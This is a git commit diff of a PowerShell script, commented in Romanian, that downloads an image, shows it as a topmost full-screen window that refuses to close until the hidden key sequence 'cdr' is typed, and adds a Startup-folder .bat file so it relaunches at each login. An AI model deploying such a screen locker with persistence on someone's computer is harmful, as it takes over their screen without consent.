1bf656e72063de5660002b4099a61e3aa08278d6
diezul <55706727+diezul@users.noreply.github.com>
2024-11-16 11:10:37 +0200

    Update y.ps1

--- y.ps1
+++ y.ps1
@@ -1,8 +1,8 @@
-# Configurare URL pentru imagine
+# URL-ul imaginii
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
-$tempImagePath = "$env:TEMP\cdr.png"
+$tempImagePath = "$env:TEMP\image.jpg"
 
-# Descărcare imagine
+# Funcție pentru descărcarea imaginii
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
@@ -12,7 +12,7 @@ function Download-Image {
     }
 }
 
-# Afișare imagine pe tot ecranul
+# Funcție pentru afișarea imaginii pe tot ecranul
 function Show-FullScreenImage {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
@@ -21,12 +21,13 @@ function Show-FullScreenImage {
     $form.WindowState = 'Maximized'
     $form.FormBorderStyle = 'None'
     $form.TopMost = $true
+    $form.BackColor = [System.Drawing.Color]::Black
     $form.KeyPreview = $true
 
     try {
         $img = [System.Drawing.Image]::FromFile($tempImagePath)
     } catch {
-        Write-Host "Eroare la încărcarea imaginii. Verificați descărcarea." -ForegroundColor Red
+        Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
         exit
     }
 
@@ -36,7 +37,7 @@ function Show-FullScreenImage {
     $pictureBox.SizeMode = 'StretchImage'
     $form.Controls.Add($pictureBox)
 
-    # Ascultă tastatura pentru secvența "cdr"
+    # Detectează combinația de taste "cdr"
     $global:keySequence = ""
     $form.KeyDown += {
         param($sender, $eventArgs)
@@ -46,7 +47,7 @@ function Show-FullScreenImage {
         }
     }
 
-    # Împiedică închiderea accidentală a aplicației
+    # Protejează împotriva închiderii accidentale
     $form.FormClosing += {
         param($sender, $e)
         if (-not $global:exitFlag) {
@@ -54,10 +55,10 @@ function Show-FullScreenImage {
         }
     }
 
-    $form.ShowDialog()
+    [void]$form.ShowDialog()
 }
 
-# Oprire completă a scriptului
+# Funcție pentru oprirea completă a scriptului
 function Stop-All {
     $global:exitFlag = $true
     Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
@@ -65,7 +66,7 @@ function Stop-All {
     exit
 }
 
-# Configurare pornire automată
+# Configurare pornire automată fără drepturi de administrator
 function Set-Startup {
     $scriptPath = $MyInvocation.MyCommand.Path
     $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
